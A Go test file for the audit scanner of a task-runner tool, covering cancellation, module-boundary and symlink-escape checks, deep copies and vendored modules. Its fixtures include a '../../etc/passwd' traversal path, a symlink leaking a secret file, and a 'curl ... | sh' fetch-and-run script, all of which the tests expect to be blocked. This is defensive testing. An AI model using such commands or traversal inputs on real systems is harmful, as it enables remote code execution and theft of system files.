// SPDX-License-Identifier: MPL-2.0

package audit

import (
	"context"
	"errors"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"

	"github.com/invowk/invowk/internal/config"
	"github.com/invowk/invowk/internal/discovery"
	"github.com/invowk/invowk/pkg/invowkfile"
	"github.com/invowk/invowk/pkg/invowkmod"
	"github.com/invowk/invowk/pkg/types"
)

const scanContextModuleScriptContent = "echo module-script\n"

type cancelAfterDoneContext struct {
	context.Context
	done        chan struct{}
	once        sync.Once
	mu          sync.Mutex
	calls       int
	cancelAfter int
}

func newCancelAfterDoneContext(parent context.Context, cancelAfter int) *cancelAfterDoneContext {
	return &cancelAfterDoneContext{
		Context:     parent,
		done:        make(chan struct{}),
		cancelAfter: cancelAfter,
	}
}

func (c *cancelAfterDoneContext) Done() <-chan struct{} {
	c.mu.Lock()
	c.calls++
	if c.calls >= c.cancelAfter {
		c.once.Do(func() { close(c.done) })
	}
	c.mu.Unlock()
	return c.done
}

func (c *cancelAfterDoneContext) Err() error {
	select {
	case <-c.done:
		return context.Canceled
	default:
		return nil
	}
}

func TestBuildScanContextCanceledBeforeDirectoryScan(t *testing.T) {
	t.Parallel()

	ctx, cancel := context.WithCancel(t.Context())
	cancel()

	_, err := BuildScanContext(ctx, types.FilesystemPath(t.TempDir()), config.DefaultConfig(), false)
	if !errors.Is(err, context.Canceled) {
		t.Fatalf("BuildScanContext() error = %v, want context.Canceled", err)
	}
	if !ScanFailureIsFatal(err) {
		t.Fatalf("BuildScanContext() cancellation should be fatal")
	}
}

func TestLoadDirectoryModulesPropagatesCancellationFromModuleLoad(t *testing.T) {
	t.Parallel()

	root := t.TempDir()
	moduleDir := filepath.Join(root, "io.example.root.invowkmod")
	createAuditTestModule(t, moduleDir, "io.example.root", "root-cmd")

	ctx := newCancelAfterDoneContext(t.Context(), 3)
	sc := &ScanContext{}
	err := sc.loadDirectoryModules(ctx, types.FilesystemPath(root))
	if !errors.Is(err, context.Canceled) {
		t.Fatalf("loadDirectoryModules() error = %v, want context.Canceled", err)
	}
	if len(sc.Diagnostics()) != 0 {
		t.Fatalf("Diagnostics() = %v, want no module-skip diagnostics for cancellation", sc.Diagnostics())
	}
}

func TestMergeDiscoveryResultsPropagatesCancellationFromModuleLoad(t *testing.T) {
	t.Parallel()

	moduleDir := filepath.Join(t.TempDir(), "io.example.root.invowkmod")
	createAuditTestModule(t, moduleDir, "io.example.root", "root-cmd")
	mod, err := invowkmod.Load(types.FilesystemPath(moduleDir))
	if err != nil {
		t.Fatalf("Load(module) = %v", err)
	}

	ctx := newCancelAfterDoneContext(t.Context(), 2)
	sc := &ScanContext{}
	err = sc.mergeDiscoveryResults(ctx, []*discovery.DiscoveredFile{{Module: mod}})
	if !errors.Is(err, context.Canceled) {
		t.Fatalf("mergeDiscoveryResults() error = %v, want context.Canceled", err)
	}
	if len(sc.Diagnostics()) != 0 {
		t.Fatalf("Diagnostics() = %v, want no module-skip diagnostics for cancellation", sc.Diagnostics())
	}
}

func TestReadScriptFileFacts_BoundaryCheck(t *testing.T) {
	t.Parallel()

	// Create a module directory with a legitimate script inside it.
	moduleDir := t.TempDir()
	scriptContent := "#!/bin/sh\necho hello"
	if err := os.WriteFile(filepath.Join(moduleDir, "run.sh"), []byte(scriptContent), 0o644); err != nil {
		t.Fatalf("failed to write script: %v", err)
	}

	// Create a sensitive file outside the module boundary.
	outsideDir := t.TempDir()
	sensitiveContent := "SECRET=hunter2"
	if err := os.WriteFile(filepath.Join(outsideDir, "secret.env"), []byte(sensitiveContent), 0o644); err != nil {
		t.Fatalf("failed to write sensitive file: %v", err)
	}
	symlinkPath := filepath.Join(moduleDir, "linked-secret.env")
	symlinkSupported := os.Symlink(filepath.Join(outsideDir, "secret.env"), symlinkPath) == nil

	// Compute a traversal path that escapes the module directory.
	relToSensitive, err := filepath.Rel(moduleDir, filepath.Join(outsideDir, "secret.env"))
	if err != nil {
		t.Fatalf("failed to compute relative path: %v", err)
	}

	tests := []struct {
		name       string
		scriptPath string
		modulePath string
		want       string
	}{
		{
			name:       "legitimate script within module",
			scriptPath: "run.sh",
			modulePath: moduleDir,
			want:       scriptContent,
		},
		{
			name:       "traversal path blocked by boundary check",
			scriptPath: relToSensitive,
			modulePath: moduleDir,
			want:       "",
		},
		{
			name:       "explicit dotdot traversal blocked",
			scriptPath: "../../etc/passwd",
			modulePath: moduleDir,
			want:       "",
		},
		{
			name:       "absolute path without module context",
			scriptPath: filepath.Join(moduleDir, "run.sh"),
			modulePath: "",
			want:       scriptContent,
		},
		{
			name:       "nonexistent file returns empty",
			scriptPath: "nonexistent.sh",
			modulePath: moduleDir,
			want:       "",
		},
	}
	if symlinkSupported {
		tests = append(tests, struct {
			name       string
			scriptPath string
			modulePath string
			want       string
		}{
			name:       "symlink escape blocked by resolved boundary check",
			scriptPath: "linked-secret.env",
			modulePath: moduleDir,
			want:       "",
		})
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()

			facts, err := readScriptFileFacts(t.Context(), tt.scriptPath, tt.modulePath)
			if err != nil {
				t.Fatalf("readScriptFileFacts() error = %v", err)
			}
			got := facts.Content
			if got != tt.want {
				t.Errorf("readScriptFileFacts(%q, %q) content = %q, want %q",
					tt.scriptPath, tt.modulePath, got, tt.want)
			}
		})
	}
}

func TestReadScriptFileFactsSymlinkEscapeLeavesContentEmptyAndSymlinkFact(t *testing.T) {
	t.Parallel()

	moduleDir := t.TempDir()
	scriptDir := filepath.Join(moduleDir, "scripts")
	if err := os.MkdirAll(scriptDir, 0o755); err != nil {
		t.Fatalf("MkdirAll(scriptDir) = %v", err)
	}
	outsideFile := filepath.Join(t.TempDir(), "secret.sh")
	if err := os.WriteFile(outsideFile, []byte("SECRET=hunter2\n"), 0o644); err != nil {
		t.Fatalf("WriteFile(outsideFile) = %v", err)
	}
	if err := os.Symlink(outsideFile, filepath.Join(scriptDir, "leak.sh")); err != nil {
		t.Skipf("symlink creation not supported: %v", err)
	}

	facts, err := readScriptFileFacts(t.Context(), "scripts/leak.sh", moduleDir)
	if err != nil {
		t.Fatalf("readScriptFileFacts() = %v", err)
	}
	if facts.Content != "" {
		t.Fatalf("script content = %q, want empty for symlink escape", facts.Content)
	}

	symlinks, err := scanModuleSymlinks(t.Context(), types.FilesystemPath(moduleDir))
	if err != nil {
		t.Fatalf("scanModuleSymlinks() = %v", err)
	}
	if len(symlinks) != 1 {
		t.Fatalf("Symlinks = %d, want 1", len(symlinks))
	}
	if !symlinks[0].EscapesRoot {
		t.Fatalf("Symlink EscapesRoot = false, want true")
	}
}

func TestReadScriptFileFactsAllowsResolvedModuleBoundary(t *testing.T) {
	t.Parallel()

	moduleDir := t.TempDir()
	scriptContent := "#!/bin/sh\necho hello"
	if err := os.WriteFile(filepath.Join(moduleDir, "run.sh"), []byte(scriptContent), 0o644); err != nil {
		t.Fatalf("WriteFile(script) = %v", err)
	}

	aliasDir := t.TempDir()
	moduleAlias := filepath.Join(aliasDir, "module.invowkmod")
	if err := os.Symlink(moduleDir, moduleAlias); err != nil {
		t.Skipf("symlink creation not supported: %v", err)
	}

	facts, err := readScriptFileFacts(t.Context(), "run.sh", moduleAlias)
	if err != nil {
		t.Fatalf("readScriptFileFacts() = %v", err)
	}
	if facts.Content != scriptContent {
		t.Fatalf("script content = %q, want %q", facts.Content, scriptContent)
	}
}

func TestBuildScanContextStandaloneFileScriptRejected(t *testing.T) { //nolint:paralleltest // t.Chdir mutates process cwd.
	root := t.TempDir()
	otherDir := t.TempDir()
	t.Chdir(otherDir)

	scriptDir := filepath.Join(root, "scripts")
	if err := os.MkdirAll(scriptDir, 0o755); err != nil {
		t.Fatalf("MkdirAll(scriptDir) error = %v", err)
	}
	scriptContent := "#!/bin/sh\ncurl https://example.test/install.sh | sh"
	if err := os.WriteFile(filepath.Join(scriptDir, "pwn.sh"), []byte(scriptContent), 0o644); err != nil {
		t.Fatalf("WriteFile(script) error = %v", err)
	}
	invowkfilePath := filepath.Join(root, "invowkfile.cue")
	if err := os.WriteFile(invowkfilePath, []byte(`cmds: [{
	name: "install"
	implementations: [{
		script: {file: "scripts/pwn.sh"}
		runtimes: [{name: "native"}]
		platforms: [{name: "linux"}]
	}]
}]
`), 0o644); err != nil {
		t.Fatalf("WriteFile(invowkfile) error = %v", err)
	}

	sc, err := BuildScanContext(t.Context(), types.FilesystemPath(invowkfilePath), config.DefaultConfig(), false)
	if err != nil {
		t.Fatalf("BuildScanContext() error = %v", err)
	}
	scripts := sc.AllScripts()
	if len(scripts) != 0 {
		t.Fatalf("scripts = %d, want 0 for invalid standalone script.file", len(scripts))
	}
	if len(sc.invowkfiles) != 1 {
		t.Fatalf("sc.invowkfiles = %d, want 1", len(sc.invowkfiles))
	}
	if sc.invowkfiles[0].ParseErr == nil {
		t.Fatal("ParseErr = nil, want standalone script.file rejection")
	}
	if !strings.Contains(sc.invowkfiles[0].ParseErr.Error(), "script file requires module invowkfile") {
		t.Fatalf("ParseErr = %v, want script.file module-only rejection", sc.invowkfiles[0].ParseErr)
	}
}

func TestBuildScanContextModuleFileScriptAccepted(t *testing.T) {
	t.Parallel()

	modulePath := createModuleFileScriptFixture(t)
	assertBuildScanContextModuleFileScript(t, "module directory", types.FilesystemPath(modulePath), modulePath)
	assertBuildScanContextModuleFileScript(t, "module invowkfile.cue", types.FilesystemPath(filepath.Join(modulePath, "invowkfile.cue")), modulePath)
	assertBuildScanContextModuleFileScript(t, "module invowkmod.cue", types.FilesystemPath(filepath.Join(modulePath, "invowkmod.cue")), modulePath)
}

func createModuleFileScriptFixture(t *testing.T) string {
	t.Helper()

	modulePath := filepath.Join(t.TempDir(), "com.example.audit.invowkmod")
	if err := os.MkdirAll(filepath.Join(modulePath, "scripts"), 0o755); err != nil {
		t.Fatalf("MkdirAll(module scripts) error = %v", err)
	}
	if err := os.WriteFile(filepath.Join(modulePath, "invowkmod.cue"), []byte(`module: "com.example.audit"
version: "1.0.0"
`), 0o644); err != nil {
		t.Fatalf("WriteFile(invowkmod.cue) error = %v", err)
	}
	if err := os.WriteFile(filepath.Join(modulePath, "scripts", "run.sh"), []byte(scanContextModuleScriptContent), 0o644); err != nil {
		t.Fatalf("WriteFile(script) error = %v", err)
	}
	if err := os.WriteFile(filepath.Join(modulePath, "invowkfile.cue"), []byte(`cmds: [{
	name: "run"
	implementations: [{
		script: {file: "scripts/run.sh"}
		runtimes: [{name: "virtual-sh"}]
		platforms: [{name: "linux"}, {name: "macos"}, {name: "windows"}]
	}]
}]
`), 0o644); err != nil {
		t.Fatalf("WriteFile(invowkfile.cue) error = %v", err)
	}

	return modulePath
}

func assertBuildScanContextModuleFileScript(t *testing.T, name string, target types.FilesystemPath, modulePath string) {
	t.Helper()

	t.Run(name, func(t *testing.T) {
		t.Parallel()

		sc, err := BuildScanContext(t.Context(), target, config.DefaultConfig(), false)
		if err != nil {
			t.Fatalf("BuildScanContext() error = %v", err)
		}
		scripts := sc.AllScripts()
		if len(scripts) != 1 {
			t.Fatalf("scripts = %d, want 1", len(scripts))
		}
		if !scripts[0].IsFile {
			t.Fatal("script IsFile = false, want true")
		}
		if scripts[0].ModulePath != types.FilesystemPath(modulePath) {
			t.Fatalf("ModulePath = %q, want %q", scripts[0].ModulePath, modulePath)
		}
		if scripts[0].Content() != scanContextModuleScriptContent {
			t.Fatalf("script content = %q, want %q", scripts[0].Content(), scanContextModuleScriptContent)
		}
	})
}

func TestScanContextAllScriptsReturnsDeepCopies(t *testing.T) {
	t.Parallel()

	sc := &ScanContext{
		scripts: []ScriptRef{{
			CommandName: "build",
			Runtimes: []invowkfile.RuntimeConfig{{
				Name:            invowkfile.RuntimeContainer,
				EnvInheritAllow: []invowkfile.EnvVarName{"SAFE"},
				Volumes:         []invowkfile.VolumeMountSpec{"/host:/container"},
			}},
		}},
	}

	first := sc.AllScripts()
	first[0].Runtimes[0].Name = invowkfile.RuntimeNative
	first[0].Runtimes[0].EnvInheritAllow[0] = "MUTATED"
	first[0].Runtimes[0].Volumes[0] = "/other:/container"

	second := sc.AllScripts()
	if second[0].Runtimes[0].Name != invowkfile.RuntimeContainer {
		t.Fatalf("runtime name = %q, want container", second[0].Runtimes[0].Name)
	}
	if second[0].Runtimes[0].EnvInheritAllow[0] != "SAFE" {
		t.Fatalf("EnvInheritAllow = %v, want SAFE", second[0].Runtimes[0].EnvInheritAllow)
	}
	if second[0].Runtimes[0].Volumes[0] != "/host:/container" {
		t.Fatalf("Volumes = %v, want original", second[0].Runtimes[0].Volumes)
	}
}

func TestScanContextInvowkfilesReturnsDeepCopies(t *testing.T) {
	t.Parallel()

	expectedCode := types.ExitCode(7)
	sc := &ScanContext{
		invowkfiles: []*ScannedInvowkfile{{
			Invowkfile: &invowkfile.Invowkfile{
				Env: &invowkfile.EnvConfig{
					Files: []invowkfile.DotenvFilePath{".env"},
					Vars:  map[invowkfile.EnvVarName]string{"TOKEN": "original"},
				},
				Commands: []invowkfile.Command{{
					Name:  "build",
					Flags: []invowkfile.Flag{{Name: "target"}},
					Args:  []invowkfile.Argument{{Name: "pkg"}},
					Watch: &invowkfile.WatchConfig{Patterns: []invowkfile.GlobPattern{"*.go"}},
					DependsOn: &invowkfile.DependsOn{
						CustomChecks: []invowkfile.CustomCheckDependency{{
							Name:         "check",
							ExpectedCode: &expectedCode,
							Alternatives: []invowkfile.CustomCheck{{
								Name:         "alt",
								ExpectedCode: &expectedCode,
							}},
						}},
					},
					Implementations: []invowkfile.Implementation{{
						Runtimes:  []invowkfile.RuntimeConfig{{Name: invowkfile.RuntimeContainer, Ports: []invowkfile.PortMappingSpec{"8080:80"}}},
						Platforms: []invowkfile.PlatformConfig{{Name: invowkfile.PlatformLinux}},
					}},
				}},
			},
		}},
	}

	first := sc.Invowkfiles()
	first[0].Invowkfile.Env.Files[0] = "mutated.env"
	first[0].Invowkfile.Env.Vars["TOKEN"] = "mutated"
	first[0].Invowkfile.Commands[0].Flags[0].Name = "mutated"
	first[0].Invowkfile.Commands[0].Args[0].Name = "mutated"
	first[0].Invowkfile.Commands[0].Watch.Patterns[0] = "*.rs"
	*first[0].Invowkfile.Commands[0].DependsOn.CustomChecks[0].ExpectedCode = 9
	*first[0].Invowkfile.Commands[0].DependsOn.CustomChecks[0].Alternatives[0].ExpectedCode = 9
	first[0].Invowkfile.Commands[0].Implementations[0].Runtimes[0].Ports[0] = "9000:90"

	second := sc.Invowkfiles()
	command := second[0].Invowkfile.Commands[0]
	if second[0].Invowkfile.Env.Files[0] != ".env" || second[0].Invowkfile.Env.Vars["TOKEN"] != "original" {
		t.Fatalf("env clone mutated: %+v", second[0].Invowkfile.Env)
	}
	if command.Flags[0].Name != "target" || command.Args[0].Name != "pkg" {
		t.Fatalf("command fields mutated: flags=%v args=%v", command.Flags, command.Args)
	}
	if command.Watch.Patterns[0] != "*.go" {
		t.Fatalf("watch patterns = %v, want original", command.Watch.Patterns)
	}
	if *command.DependsOn.CustomChecks[0].ExpectedCode != 7 ||
		*command.DependsOn.CustomChecks[0].Alternatives[0].ExpectedCode != 7 {
		t.Fatalf("custom check expected codes mutated: %+v", command.DependsOn.CustomChecks)
	}
	if command.Implementations[0].Runtimes[0].Ports[0] != "8080:80" {
		t.Fatalf("runtime ports = %v, want original", command.Implementations[0].Runtimes[0].Ports)
	}
}

func TestScanContextModulesReturnsInvowkfileDeepCopies(t *testing.T) {
	t.Parallel()

	sc := &ScanContext{
		modules: []*ScannedModule{{
			Invowkfile: &invowkfile.Invowkfile{
				Commands: []invowkfile.Command{{
					Name: "serve",
					Implementations: []invowkfile.Implementation{{
						Runtimes: []invowkfile.RuntimeConfig{{
							Name:    invowkfile.RuntimeContainer,
							Volumes: []invowkfile.VolumeMountSpec{"/data:/data:ro"},
						}},
					}},
				}},
			},
		}},
	}

	first := sc.Modules()
	first[0].Invowkfile.Commands[0].Implementations[0].Runtimes[0].Volumes[0] = "/tmp:/data"

	second := sc.Modules()
	got := second[0].Invowkfile.Commands[0].Implementations[0].Runtimes[0].Volumes[0]
	if got != "/data:/data:ro" {
		t.Fatalf("module runtime volume = %q, want original", got)
	}
}

func TestBuildScanContextIncludedModuleKeepsLockAndVendoredArtifacts(t *testing.T) {
	t.Parallel()

	root := t.TempDir()
	includeDir := filepath.Join(t.TempDir(), "io.example.included.invowkmod")
	createAuditTestModule(t, includeDir, "io.example.included", "included-cmd")
	vendorDir := filepath.Join(includeDir, invowkmod.VendoredModulesDir, "io.example.dep.invowkmod")
	createAuditTestModule(t, vendorDir, "io.example.dep", "dep-cmd")
	hash, err := invowkmod.ComputeModuleHash(vendorDir)
	if err != nil {
		t.Fatalf("ComputeModuleHash() = %v", err)
	}
	lock := invowkmod.NewLockFile()
	lock.Modules["https://example.com/dep.git"] = invowkmod.LockedModule{
		GitURL:          "https://example.com/dep.git",
		Version:         "^1.0.0",
		ResolvedVersion: "1.0.0",
		GitCommit:       "0123456789abcdef0123456789abcdef01234567",
		Namespace:       "io.example.dep",
		CommandSourceID: "io.example.dep",
		ModuleID:        "io.example.dep",
		ContentHash:     hash,
	}
	if saveErr := lock.Save(filepath.Join(includeDir, invowkmod.LockFileName)); saveErr != nil {
		t.Fatalf("lock.Save() = %v", saveErr)
	}
	if writeErr := os.WriteFile(filepath.Join(vendorDir, "tampered.txt"), []byte("changed after lock"), 0o644); writeErr != nil {
		t.Fatalf("write tampered file: %v", writeErr)
	}

	cfg := config.DefaultConfig()
	cfg.Includes = []config.IncludeEntry{{Path: config.ModuleIncludePath(includeDir)}}
	sc, err := BuildScanContext(t.Context(), types.FilesystemPath(root), cfg, false)
	if err != nil {
		t.Fatalf("BuildScanContext() = %v", err)
	}

	var included *ScannedModule
	for _, mod := range sc.Modules() {
		if mod.SurfaceID == "io.example.included" {
			included = mod
			break
		}
	}
	if included == nil {
		t.Fatalf("included module not scanned; modules: %v", sc.Modules())
	}
	if included.LockFile == nil {
		t.Fatal("included LockFile = nil, want loaded lock file")
	}
	if len(included.VendoredModules) != 1 {
		t.Fatalf("included VendoredModules = %d, want 1", len(included.VendoredModules))
	}

	var vendored *ScannedModule
	for _, mod := range sc.Modules() {
		if mod.SurfaceID == "io.example.dep" {
			vendored = mod
			break
		}
	}
	if vendored == nil {
		t.Fatalf("vendored module not scanned as first-class surface; modules: %v", sc.Modules())
	}
	if vendored.SurfaceKind != SurfaceKindVendoredModule {
		t.Fatalf("vendored SurfaceKind = %q, want %q", vendored.SurfaceKind, SurfaceKindVendoredModule)
	}

	hasVendoredScript := false
	for _, script := range sc.AllScripts() {
		if script.SurfaceID == "io.example.dep" && script.SurfaceKind == SurfaceKindVendoredModule {
			hasVendoredScript = true
			break
		}
	}
	if !hasVendoredScript {
		t.Fatal("vendored module scripts were not exposed to audit checkers")
	}
}

func TestBuildScanContextWarnsAndIgnoresNestedVendoredModules(t *testing.T) {
	t.Parallel()

	root := t.TempDir()
	moduleDir := filepath.Join(root, "io.example.root.invowkmod")
	createAuditTestModule(t, moduleDir, "io.example.root", "root-cmd")
	childDir := filepath.Join(moduleDir, invowkmod.VendoredModulesDir, "io.example.child.invowkmod")
	createAuditTestModule(t, childDir, "io.example.child", "child-cmd")
	nestedDir := filepath.Join(childDir, invowkmod.VendoredModulesDir, "io.example.nested.invowkmod")
	createAuditTestModule(t, nestedDir, "io.example.nested", "nested-cmd")

	sc, err := BuildScanContext(t.Context(), types.FilesystemPath(root), config.DefaultConfig(), false)
	if err != nil {
		t.Fatalf("BuildScanContext() = %v", err)
	}

	var foundDiagnostic bool
	for _, diagnostic := range sc.Diagnostics() {
		if diagnostic.Code() == diagnosticNestedVendoredIgnored && diagnostic.Path() == types.FilesystemPath(childDir) {
			foundDiagnostic = true
			break
		}
	}
	if !foundDiagnostic {
		t.Fatalf("missing %s diagnostic; diagnostics=%v", diagnosticNestedVendoredIgnored, sc.Diagnostics())
	}

	for _, mod := range sc.Modules() {
		if mod.SurfaceID == "io.example.nested" {
			t.Fatal("nested vendored module was scanned as a first-class audit surface")
		}
	}
	for _, script := range sc.AllScripts() {
		if script.SurfaceID == "io.example.nested" {
			t.Fatal("nested vendored module script was exposed to audit checkers")
		}
	}
}

func TestScanContextModulesReturnsCheckerOwnedSnapshots(t *testing.T) {
	t.Parallel()

	sc := newModuleOnlyContext(t, &ScannedModule{
		SurfaceID: "root",
		Module: &invowkmod.Module{
			Metadata: &invowkmod.Invowkmod{
				Module:  "io.example.root",
				Version: "1.0.0",
				Requires: []invowkmod.ModuleRequirement{{
					GitURL:  "https://github.com/example/dep.git",
					Version: "1.0.0",
				}},
			},
		},
		Symlinks: []SymlinkRef{{RelPath: "link"}},
	})

	first := sc.Modules()
	first[0].SurfaceID = "mutated"
	first[0].Module.Metadata.Module = "io.example.mutated"
	first[0].Module.Metadata.Requires[0].GitURL = "https://github.com/example/other.git"
	first[0].Symlinks[0].RelPath = "mutated-link"

	second := sc.Modules()
	if second[0].SurfaceID != "root" {
		t.Fatalf("SurfaceID = %q, want root", second[0].SurfaceID)
	}
	if second[0].Module.Metadata.Module != "io.example.root" {
		t.Fatalf("Module = %q, want io.example.root", second[0].Module.Metadata.Module)
	}
	if second[0].Module.Metadata.Requires[0].GitURL != "https://github.com/example/dep.git" {
		t.Fatalf("GitURL = %q, want original dependency", second[0].Module.Metadata.Requires[0].GitURL)
	}
	if second[0].Symlinks[0].RelPath != "link" {
		t.Fatalf("Symlink RelPath = %q, want link", second[0].Symlinks[0].RelPath)
	}
}

func createAuditTestModule(t *testing.T, moduleDir, moduleID, cmdName string) {
	t.Helper()
	if err := os.MkdirAll(moduleDir, 0o755); err != nil {
		t.Fatalf("mkdir module: %v", err)
	}
	if err := os.WriteFile(filepath.Join(moduleDir, "invowkmod.cue"), []byte(`module: "`+moduleID+`"
version: "1.0.0"
`), 0o644); err != nil {
		t.Fatalf("write invowkmod.cue: %v", err)
	}
	if err := os.WriteFile(filepath.Join(moduleDir, "invowkfile.cue"), []byte(`cmds: [{
	name: "`+cmdName+`"
	implementations: [{
		script: {content: "echo test"}
		runtimes: [{name: "native"}]
		platforms: [{name: "linux"}, {name: "macos"}]
	}]
}]
`), 0o644); err != nil {
		t.Fatalf("write invowkfile.cue: %v", err)
	}
}
